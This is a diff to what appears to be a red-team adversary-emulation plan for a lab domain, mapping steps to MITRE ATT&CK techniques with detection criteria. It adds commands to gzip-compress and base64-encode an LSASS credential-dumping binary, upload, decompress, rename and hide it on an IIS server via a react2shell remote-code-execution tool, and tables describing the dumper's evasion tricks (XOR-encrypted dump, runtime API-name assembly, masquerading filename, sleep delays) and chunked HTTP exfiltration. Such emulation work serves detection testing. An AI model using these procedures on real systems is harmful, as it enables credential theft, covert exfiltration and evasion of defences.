@@ -66,11 +66,17 @@ Both the LSASS process name and the `RtlCreateProcessReflection` API name are
 absent from the binary's static string table - each is assembled at runtime as a
 `wchar_t` or `char` array.
 
-Ingress transfer uses the same react2shell eval-based chunked upload as Phase 1.
-Execution is performed from the elevated dnscat2 C2 shell (SYSTEM). Exfiltration
-uses react2shell's `download` command, which reads `f.elif` in 8,192-byte chunks,
-base64-encodes each, and returns them in successive HTTP responses for the attacker
-to capture and reassemble into the original dump.
+Ingress transfer uses the same react2shell eval-based chunked upload as Phase 1,
+but with an additional compression obfuscation layer (T1027.015): the binary is
+compressed with gzip at maximum level (9) and base64-encoded in a single unwrapped
+line before staging, reducing transfer size by ~62% and evading signature-based
+detection of the raw PE. On the target, the compressed payload is decompressed
+via Node.js built-in `zlib.gunzipSync` (no child process spawn), then the hidden
+attribute is set via `attrib.exe +h` to reduce filesystem visibility (T1564.001)
+before execution. Execution is performed from the elevated dnscat2 C2 shell (SYSTEM).
+Exfiltration uses react2shell's `download` command, which reads `f.elif` in
+8,192-byte chunks, base64-encodes each, and returns them in successive HTTP responses
+for the attacker to capture and reassemble into the original dump.
 
 ### Setup
 
@@ -82,12 +88,22 @@ to capture and reassemble into the original dump.
 
   Output binary: `resources\payloads\LsassReflectDumping\ReflectDump\x64\Release\ReflectDump.exe`
 
-- ☣️ Encode `ReflectDump.exe` to base64
+- ☣️ Compress and encode `ReflectDump.exe` to gzip + base64 (T1027.015)
 
   ```bash
   cd resources/payloads/react2shell-tool
-  python encode_payload.py ../LsassReflectDumping/ReflectDump/x64/Release/ReflectDump.exe -o WdiBoot.b64 -l 0
+  python compress_payload.py ../LsassReflectDumping/ReflectDump/x64/Release/ReflectDump.exe -o WdiBoot.gz.b64 --b64 -l 0
   ```
+
+  - ***Expected Output***
+
+    ```text
+    [+] Compression successful!
+    [*] Original size: <size> bytes
+    [*] Compressed size: <compressed_size> bytes
+    [*] Compression ratio: ~62%
+    [*] Output file: WdiBoot.gz.b64
+    ```
 
 ### Procedures
 
@@ -106,20 +122,30 @@ to capture and reassemble into the original dump.
     rce >
     ```
 
-- ☣️ Upload and decode `ReflectDump.exe` to the IIS server (staged as `WdiBoot.exe`)
+- ☣️ Upload and decompress `ReflectDump.exe` to the IIS server (staged as `WdiBoot.exe`)
 
   ```
-  rce > upload WdiBoot.b64 C:\Windows\Temp\WdiBoot.b64
-  rce > decode C:\Windows\Temp\WdiBoot.b64 C:\Windows\Temp\WdiBoot.bin
+  rce > upload WdiBoot.gz.b64 C:\Windows\Temp\WdiBoot.gz.b64
+  rce > decode C:\Windows\Temp\WdiBoot.gz.b64 C:\Windows\Temp\WdiBoot.gz
+  rce > decompress C:\Windows\Temp\WdiBoot.gz C:\Windows\Temp\WdiBoot.bin
   rce > rename C:\Windows\Temp\WdiBoot.bin C:\Windows\Temp\WdiBoot.exe
+  rce > hide C:\Windows\Temp\WdiBoot.exe
   ```
 
-  - ***Expected Output (each file)***
+  - ***Expected Output***
 
     ```text
-    [*] Uploading <file> via eval (NO spawn - STEALTH!)...
-    [+] File uploaded successfully (NO process spawn!)
-    [+] File decoded successfully (NO process spawn!)
+    [*] Uploading WdiBoot.gz.b64 via eval (NO spawn - STEALTH!)...
+    [+] File uploaded successfully -> C:\Windows\Temp\WdiBoot.gz.b64 (NO process spawn!)
+    [*] Decoding C:\Windows\Temp\WdiBoot.gz.b64 -> C:\Windows\Temp\WdiBoot.gz via eval (NO spawn - STEALTH!)...
+    [+] File decoded successfully -> C:\Windows\Temp\WdiBoot.gz (NO process spawn!)
+    [*] Decompressing C:\Windows\Temp\WdiBoot.gz -> C:\Windows\Temp\WdiBoot.bin via eval (NO spawn - STEALTH!)...
+    [+] File decompressed successfully -> C:\Windows\Temp\WdiBoot.bin (NO process spawn!)
+    [*] T1027.015 - Obfuscated Files or Information: Compression
+    [+] File renamed successfully -> C:\Windows\Temp\WdiBoot.exe (NO process spawn!)
+    [*] Setting hidden attribute on C:\Windows\Temp\WdiBoot.exe (spawns attrib.exe - OBSERVABLE!)...
+    [+] Hidden attribute set on C:\Windows\Temp\WdiBoot.exe (attrib.exe spawned)
+    [*] Detection: node.exe spawns attrib.exe with arguments ['+h', 'C:\Windows\Temp\WdiBoot.exe']
     ```
 
 - ☣️ From the elevated dnscat2 C2 session (SYSTEM), navigate to `C:\Windows\Temp` and execute `WdiBoot.exe`
@@ -220,15 +246,16 @@ to capture and reassemble into the original dump.
 
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
 |  - | - | - | - | - | - | - | - | - | - | -
-| Command and Control | T1105 | Ingress Tool Transfer | Windows | Sequential POST requests to `react.testlab.local` RSC endpoint appending 2,000-char base64 blocks to `C:\Windows\Temp\WdiBoot.b64` via eval-based `fs.appendFileSync`; no child process spawned | Not Calibrated - Not Benign | react2shell `upload` command stages `ReflectDump.exe` (as `WdiBoot.b64`) to IIS server in chunks; identical eval-based chunked path to Phase 1 - already scored in Phase 1 Step 3 (same host, same actor, same mechanism) | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
-| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | POST to RSC endpoint decodes `WdiBoot.b64` to `WdiBoot.bin` via `Buffer.from(..., 'base64')`; `WdiBoot.bin` subsequently renamed to `WdiBoot.exe` | Not Calibrated - Not Benign | react2shell `decode` and `rename` commands convert staged base64 to executable in-place with no child process or decoder binary - identical mechanism to Phase 1 Step 3, already scored | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decode()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
-| Discovery | T1057 | Process Discovery | Windows | `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)` + `Process32NextW` loop issued by `WdiBoot.exe` to locate LSASS PID; target name `lsass.exe` absent from binary strings | Calibrated - Not Benign | `QueryProcessEntry()` enumerates all running processes via toolhelp snapshot to obtain lsass PID; process name assembled at runtime as a `wchar_t` array | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp QueryProcessEntry()](../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
-| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Windows | `WdiBoot.exe` invokes `RtlCreateProcessReflection` to clone `lsass.exe` and writes an XOR-encrypted minidump to `C:\Windows\Temp\f.elif` | Calibrated - Not Benign | ReflectDump forks LSASS via `RtlCreateProcessReflection`, dumps the fork via `MiniDumpWriteDump` with `IoWriteAllCallback` into 75 MB heap buffer, XOR-encrypts buffer in-place with key `0x35` via `XorBuffer`, then flushes to `f.elif`; reflection terminated after dump | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
-| Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `WdiBoot.exe` writes `C:\Windows\Temp\f.elif` with entire minidump buffer XOR-encrypted using single-byte key `0x35`; file on disk contains no MDMP magic bytes or recognisable credential strings - appears as opaque binary noise to static scanners | Calibrated - Not Benign | ReflectDump XOR-encrypts entire 75 MB dump buffer in-place via `XorBuffer` with hardcoded key `0x35` before `WriteFile`; encryption applied to obfuscate LSASS memory dump content and evade signature-based detection of minidump format | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp XorBuffer()](../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
-| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `WdiBoot.exe` (ReflectDump) contains no static string or import reference to `RtlCreateProcessReflection` or `lsass.exe`; both assembled at runtime as character arrays; no IAT entry for the undocumented API; `RtlCreateProcessReflection` resolved via runtime `GetProcAddress` call | Not Calibrated - Not Benign | ReflectDump assembles the name `RtlCreateProcessReflection` as a runtime `char` array and passes it to `GetProcAddress`; LSASS target name built as a runtime `wchar_t` array - both strings absent from binary's static string table and import table, defeating IAT and string-based detection | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
-| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | PE at `C:\Windows\Temp\WdiBoot.exe`; output artefact at `C:\Windows\Temp\f.elif` lacks `.dmp` extension | Calibrated - Not Benign | ReflectDump staged as `WdiBoot.exe` (mimics Windows Diagnostics Infrastructure component); dump written as `f.elif` to suppress extension-based detection rules | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
-| Exfiltration | T1030 | Data Transfer Size Limits | Windows | `node.exe` transmits the contents of `f.elif` via multiple 8,192-byte HTTP POST responses to the attacker | Calibrated - Not Benign | react2shell `download` command exfiltrates `f.elif` as base64 in 8,192-byte chunks over successive HTTP responses | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py download()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
-| Defense Evasion | T1678 | Delay Execution | Windows | `WdiBoot.exe` (`ReflectDump`) process runtime is approximately 10 seconds with no stdout output; two `Sleep(5000)` calls visible as sustained CPU-idle waits in process telemetry: first sleep occurs after `RtlCreateProcessReflection` (line 165), second sleep occurs after `WriteFile` (line 194); binary exits cleanly only after output file size validation passes | Not Calibrated - Not Benign | `ReflectDump` sleeps 5 seconds after forking the LSASS reflection via `RtlCreateProcessReflection` (allowing clone internal state to stabilize before `MiniDumpWriteDump`), then sleeps a second 5 seconds after `WriteFile` flushes the XOR-encrypted buffer to disk (before validating `f.elif` size and terminating the reflection); deliberate delays reduce the likelihood of behavioral detections triggered by rapid process-create → dump → exit sequences | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
+| Command and Control | T1105 | Ingress Tool Transfer | Windows | Sequential POST requests to `react.testlab.local` RSC endpoint appending 2,000-char base64 blocks to `C:\Windows\Temp\WdiBoot.gz.b64` via eval-based `fs.appendFileSync`; no child process spawned | Not Calibrated - Not Benign | react2shell `upload` command stages compressed+encoded `ReflectDump.exe` (as `WdiBoot.gz.b64`) to IIS server in chunks; identical eval-based chunked path to Phase 1 - already scored in Phase 1 Step 3 (same host, same actor, same mechanism) | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
+| Defense Evasion | T1027.015 | Obfuscated Files or Information: Compression | Windows | `node.exe` reads `C:\Windows\Temp\WdiBoot.gz.b64`, decompresses via `zlib.gunzipSync`, writes `C:\Windows\Temp\WdiBoot.exe` on react.testlab.local | Calibrated - Not Benign | react2shell `decompress` command decompresses gzip-compressed payload using built-in Node.js `zlib` module; compression reduces transfer size by ~62% and evades signature-based detection of raw PE structure during upload; decompression occurs via eval-based `fs.writeFileSync(out, zlib.gunzipSync(fs.readFileSync(in)))` | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decompress()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py), [compress_payload.py](../../resources/payloads/react2shell-tool/compress_payload.py) | -
+| Defense Evasion | T1564.001 | Hide Artifacts: Hidden Files and Directories | Windows | `node.exe` spawns `attrib.exe` with arguments `['+h', 'C:\Windows\Temp\WdiBoot.exe']` on react.testlab.local | Calibrated - Not Benign | react2shell `hide` command sets Windows hidden attribute on staged credential dumping tool to reduce filesystem visibility; spawns `attrib.exe +h` via `child_process.spawnSync` - intentionally observable process creation for Calibrated detection; Node.js `fs.chmod` only supports Unix permissions, not Windows attributes, requiring external binary spawn | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py hide()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
+| Discovery | T1057 | Process Discovery | Windows | `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)` + `Process32NextW` loop issued by `WdiBoot.exe` to locate LSASS PID; target name `lsass.exe` absent from binary strings | Calibrated - Not Benign | `QueryProcessEntry()` enumerates all running processes via toolhelp snapshot to obtain lsass PID; process name assembled at runtime as a `wchar_t` array | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp QueryProcessEntry()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
+| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Windows | `WdiBoot.exe` invokes `RtlCreateProcessReflection` to clone `lsass.exe` and writes an XOR-encrypted minidump to `C:\Windows\Temp\f.elif` | Calibrated - Not Benign | ReflectDump forks LSASS via `RtlCreateProcessReflection`, dumps the fork via `MiniDumpWriteDump` with `IoWriteAllCallback` into 75 MB heap buffer, XOR-encrypts buffer in-place with key `0x35` via `XorBuffer`, then flushes to `f.elif`; reflection terminated after dump | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
+| Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `WdiBoot.exe` writes `C:\Windows\Temp\f.elif` with entire minidump buffer XOR-encrypted using single-byte key `0x35`; file on disk contains no MDMP magic bytes or recognisable credential strings - appears as opaque binary noise to static scanners | Calibrated - Not Benign | ReflectDump XOR-encrypts entire 75 MB dump buffer in-place via `XorBuffer` with hardcoded key `0x35` before `WriteFile`; encryption applied to obfuscate LSASS memory dump content and evade signature-based detection of minidump format | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp XorBuffer()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
+| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `WdiBoot.exe` (ReflectDump) contains no static string or import reference to `RtlCreateProcessReflection` or `lsass.exe`; both assembled at runtime as character arrays; no IAT entry for the undocumented API; `RtlCreateProcessReflection` resolved via runtime `GetProcAddress` call | Not Calibrated - Not Benign | ReflectDump assembles the name `RtlCreateProcessReflection` as a runtime `char` array and passes it to `GetProcAddress`; LSASS target name built as a runtime `wchar_t` array - both strings absent from binary's static string table and import table, defeating IAT and string-based detection | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
+| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | PE at `C:\Windows\Temp\WdiBoot.exe`; output artefact at `C:\Windows\Temp\f.elif` lacks `.dmp` extension | Calibrated - Not Benign | ReflectDump staged as `WdiBoot.exe` (mimics Windows Diagnostics Infrastructure component); dump written as `f.elif` to suppress extension-based detection rules | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
+| Exfiltration | T1030 | Data Transfer Size Limits | Windows | `node.exe` transmits the contents of `f.elif` via multiple 8,192-byte HTTP POST responses to the attacker | Calibrated - Not Benign | react2shell `download` command exfiltrates `f.elif` as base64 in 8,192-byte chunks over successive HTTP responses | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py download()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
+| Defense Evasion | T1678 | Delay Execution | Windows | `WdiBoot.exe` (`ReflectDump`) process runtime is approximately 10 seconds with no stdout output; two `Sleep(5000)` calls visible as sustained CPU-idle waits in process telemetry: first sleep occurs after `RtlCreateProcessReflection` (line 165), second sleep occurs after `WriteFile` (line 194); binary exits cleanly only after output file size validation passes | Not Calibrated - Not Benign | `ReflectDump` sleeps 5 seconds after forking the LSASS reflection via `RtlCreateProcessReflection` (allowing clone internal state to stabilize before `MiniDumpWriteDump`), then sleeps a second 5 seconds after `WriteFile` flushes the XOR-encrypted buffer to disk (before validating `f.elif` size and terminating the reflection); deliberate delays reduce the likelihood of behavioral detections triggered by rapid process-create → dump → exit sequences | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../../resources/payloads/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | -
 
 ---
 
@@ -391,8 +418,9 @@ prerequisite for Pass-the-Hash lateral movement in Phase 3.
 
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
 |  - | - | - | - | - | - | - | - | - | - | -
-| Command and Control | T1105 | Ingress Tool Transfer | Windows | Sequential POST requests to `react.testlab.local` RSC endpoint appending 2,000-char base64 blocks to `C:\Windows\Temp\WmiAvQuery.b64` via eval-based `fs.appendFileSync`; no child process spawned | Not Calibrated - Not Benign | react2shell `upload` command stages `WmiAvQuery.exe` (as `WmiAvQuery.b64`) to IIS server; identical eval-based chunked mechanism to Phase 1 Step 3 and Phase 2 Step 4 — already scored | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
-| Discovery | T1518.001 | Software Discovery: Security Software Discovery | Windows | `WmiAvQuery.exe` queries `ROOT\SecurityCenter2` WMI namespace executing WQL `SELECT * FROM AntiVirusProduct` via `IWbemServices::ExecQuery` | Calibrated - Not Benign | `WmiAvQuery.exe` enumerates installed AV products — display name, instance GUID, paths, and product state — by connecting to `ROOT\SecurityCenter2` via native WMI COM APIs (`IWbemLocator` → `IWbemServices`) | react.testlab.local | NT AUTHORITY\SYSTEM | [main.cpp](../resources/payloads/WmiAvQuery/main.cpp) | -
+| Command and Control | T1105 | Ingress Tool Transfer | Windows | Sequential POST requests to `react.testlab.local` RSC endpoint appending 2,000-char base64 blocks to `C:\Windows\Temp\WmiAvQuery.b64` via eval-based `fs.appendFileSync`; no child process spawned | Not Calibrated - Not Benign | react2shell `upload` command stages `WmiAvQuery.exe` (as `WmiAvQuery.b64`) to IIS server; identical eval-based chunked mechanism to Phase 1 Step 3 and Phase 2 Step 4 — already scored | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
+| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | POST to RSC endpoint decodes `WmiAvQuery.b64` to `WmiAvQuery.bin` via `Buffer.from(..., 'base64')`; `WmiAvQuery.bin` subsequently renamed to `WmiAvQuery.exe` | Not Calibrated - Not Benign | react2shell `decode` and `rename` commands convert staged base64 to executable in-place with no child process or decoder binary - identical mechanism to Phase 1 Step 3, already scored | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decode()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
+| Discovery | T1518.001 | Software Discovery: Security Software Discovery | Windows | `WmiAvQuery.exe` queries `ROOT\SecurityCenter2` WMI namespace executing WQL `SELECT * FROM AntiVirusProduct` via `IWbemServices::ExecQuery` | Calibrated - Not Benign | `WmiAvQuery.exe` enumerates installed AV products — display name, instance GUID, paths, and product state — by connecting to `ROOT\SecurityCenter2` via native WMI COM APIs (`IWbemLocator` → `IWbemServices`) | react.testlab.local | NT AUTHORITY\SYSTEM | [main.cpp](../../resources/payloads/WmiAvQuery/main.cpp) | -
 | Discovery | T1033 | System Owner/User Discovery | Windows | `RuntimeBroker.exe` (ghost process) spawns `cmd.exe` which executes `whoami.exe /all` on react.testlab.local | Not Calibrated - Not Benign | `whoami /all` dumps the full SYSTEM token - user SID, group memberships, privilege list, integrity level - confirming successful escalation and presence of `SeDebugPrivilege` | react.testlab.local | NT AUTHORITY\SYSTEM | - | -
 | Discovery | T1018 | Remote System Discovery | Windows | `RuntimeBroker.exe` (ghost process) spawns `cmd.exe` which executes `nltest.exe /dsgetdc:TESTLAB` to query Domain Controller information on react.testlab.local | Not Calibrated - Not Benign | `nltest /dsgetdc:TESTLAB` queries the Netlogon service to return DC hostname (`DC01`), IP (`10.12.10.10`), site, and role flags (PDC, GC, KDC) from the SYSTEM dnscat2 shell | react.testlab.local | NT AUTHORITY\SYSTEM | - | -
 | Discovery | T1069.002 | Permission Groups Discovery: Domain Groups | Windows | `RuntimeBroker.exe` (ghost process) spawns `cmd.exe` which executes `net.exe group "Domain Admins" /domain` on react.testlab.local | Not Calibrated - Not Benign | `net group "Domain Admins" /domain` enumerates DA members to identify high-value credential targets from the LSASS dump | react.testlab.local | NT AUTHORITY\SYSTEM | - | -
